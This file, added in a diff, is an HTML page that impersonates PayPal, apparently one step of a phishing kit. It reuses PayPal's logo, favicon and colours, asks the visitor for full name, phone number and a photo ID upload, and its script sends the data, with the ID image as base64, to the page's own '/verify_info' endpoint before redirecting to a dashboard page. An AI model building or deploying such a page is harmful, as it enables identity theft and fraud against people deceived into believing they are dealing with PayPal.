@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Information - PayPal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f8f9; /* PayPal's light gray background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Stronger shadow */
+            padding: 32px; /* Generous padding */
+            width: 100%;
+            max-width: 450px; /* Slightly wider for the content */
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .paypal-logo {
+            width: 100px;
+            height: 30px;
+            background: url('https://www.paypalobjects.com/webstatic/mktg/icons/primary-logo.png') no-repeat center center;
+            background-size: contain;
+            margin: 0 auto 30px auto;
+            font-size: 0;
+        }
+
+        h1 {
+            color: #003087; /* PayPal's dark blue */
+            font-size: 28px; /* Larger font size */
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 24px; /* Space between input fields */
+            text-align: left;
+            position: relative; /* For floating label */
+        }
+
+        .input-label {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            color: #6a6a6a;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease-out;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 12px 6px 12px; /* Top padding for floating label */
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            box-sizing: border-box;
+            background-color: #fff;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
+        }
+
+        /* Floating Label effect */
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: 6px;
+            font-size: 12px;
+            color: #003087;
+        }
+        .input-field:not(:placeholder-shown) {
+            padding-top: 18px;
+        }
+
+        /* Styles for the "Upload a photo ID" button, matching the PayPal style */
+        .upload-photo-id-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            cursor: pointer; /* Indicate it's clickable */
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        .upload-photo-id-container:hover {
+            border-color: #0070ba;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.1);
+        }
+        .upload-photo-id-container .text-info {
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+        .upload-photo-id-container .text-info .icon {
+            margin-right: 10px;
+            color: #f7a823; /* PayPal's yellow/orange for info icon */
+            font-size: 20px;
+        }
+        .upload-photo-id-button {
+            background-color: #0070ba; /* PayPal blue */
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px; /* More rounded for button */
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .upload-photo-id-button:hover {
+            background-color: #003087;
+        }
+        /* Hide the default file input */
+        .hidden-file-input {
+            display: none;
+        }
+        .image-preview-container {
+            margin-top: -15px; /* Adjust to pull closer to upload button */
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .image-preview {
+            max-width: 100px;
+            max-height: 100px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            display: block;
+            margin: 0 auto;
+            object-fit: cover;
+        }
+        .info-note { /* Style for the "We generally take up to..." message */
+            font-size: 14px;
+            color: #555;
+            margin-top: 20px;
+            text-align: center;
+            padding: 0 10px;
+        }
+        .info-note .info-icon {
+            margin-right: 5px;
+            color: #555;
+            font-size: 16px;
+            vertical-align: middle;
+        }
+
+        /* Action buttons at the bottom */
+        .action-button {
+            background-color: #0070ba;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        .action-button:hover {
+            background-color: #003087;
+        }
+        .action-button:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
+        }
+        .secondary-link {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #0070ba;
+            text-decoration: none;
+            font-weight: 600; /* Made consistent with other links */
+        }
+        .secondary-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="paypal-logo" role="img" aria-label="PayPal Logo"></div>
+        <h1>Verify Your Information</h1>
+        <p>Please confirm your details and upload a photo ID to proceed securely.</p>
+
+        <form id="verification-form">
+            <div class="input-group">
+                <input type="text" id="full-name" name="full-name" class="input-field" required placeholder=" ">
+                <label for="full-name" class="input-label">Full Name</label>
+            </div>
+            <div class="input-group">
+                <input type="tel" id="phone-number" name="phone-number" class="input-field" required placeholder=" ">
+                <label for="phone-number" class="input-label">Phone Number</label>
+            </div>
+
+            <div class="upload-photo-id-container">
+                <div class="text-info">
+                    <span class="icon">&#9200;</span> <span>Upload a photo ID</span>
+                </div>
+                <input type="file" id="photo-id-input" name="photo-id" accept="image/*" class="hidden-file-input">
+                <button type="button" class="upload-photo-id-button" id="upload-button">Upload</button>
+            </div>
+            <div class="image-preview-container">
+                <img id="photo-id-preview" class="image-preview" src="" alt="Photo ID Preview" style="display: none;">
+            </div>
+            <p class="info-note">
+                <span class="info-icon">&#9432;</span> We generally take up to 1 business day(s) to review requests and get back.
+            </p>
+
+            <button type="submit" class="action-button" style="margin-top: 30px;">Confirm and Continue</button>
+            <a href="./index.html" class="secondary-link">Not you? Go back to Login</a>
+        </form>
+    </div>
+
+    <script>
+        const verificationForm = document.getElementById('verification-form');
+        const fullNameInput = document.getElementById('full-name');
+        const phoneNumberInput = document.getElementById('phone-number');
+        const photoIdInput = document.getElementById('photo-id-input');
+        const photoIdPreview = document.getElementById('photo-id-preview');
+        const uploadButton = document.getElementById('upload-button');
+
+        // Event listener to trigger hidden file input when "Upload" button is clicked
+        uploadButton.addEventListener('click', () => {
+            photoIdInput.click(); // Programmatically click the hidden file input
+        });
+
+        // Event listener for image preview when file is selected
+        photoIdInput.addEventListener('change', function() {
+            const file = this.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    photoIdPreview.src = e.target.result;
+                    photoIdPreview.style.display = 'block';
+                };
+                reader.readAsDataURL(file); // Read file as Base64 data URL
+            } else {
+                photoIdPreview.src = '';
+                photoIdPreview.style.display = 'none';
+            }
+        });
+
+        verificationForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const fullName = fullNameInput.value.trim();
+            const phoneNumber = phoneNumberInput.value.trim();
+            let photoIdBase64 = ''; // To store the base64 string
+
+            if (fullName === '' || phoneNumber === '') {
+                alert('Please enter your full name and phone number.');
+                return;
+            }
+
+            // Handle image file if selected
+            if (photoIdInput.files.length > 0) {
+                const file = photoIdInput.files[0];
+                if (file) {
+                    photoIdBase64 = await new Promise((resolve, reject) => {
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.onerror = reject;
+                        reader.readAsDataURL(file);
+                    });
+                }
+            }
+
+            const data = {
+                fullName: fullName,
+                phoneNumber: phoneNumber,
+                photoId: photoIdBase64
+            };
+
+            try {
+                const response = await fetch('/verify_info', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    alert('Information submitted for verification! Redirecting to dashboard...');
+                    window.location.href = './dashboard.html'; // Redirect to the final dashboard page
+                } else {
+                    const errorData = await response.json();
+                    alert(`Verification failed: ${errorData.message || 'Server error'}`);
+                }
+            } catch (error) {
+                console.error('Error during verification:', error);
+                alert('An error occurred during verification. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
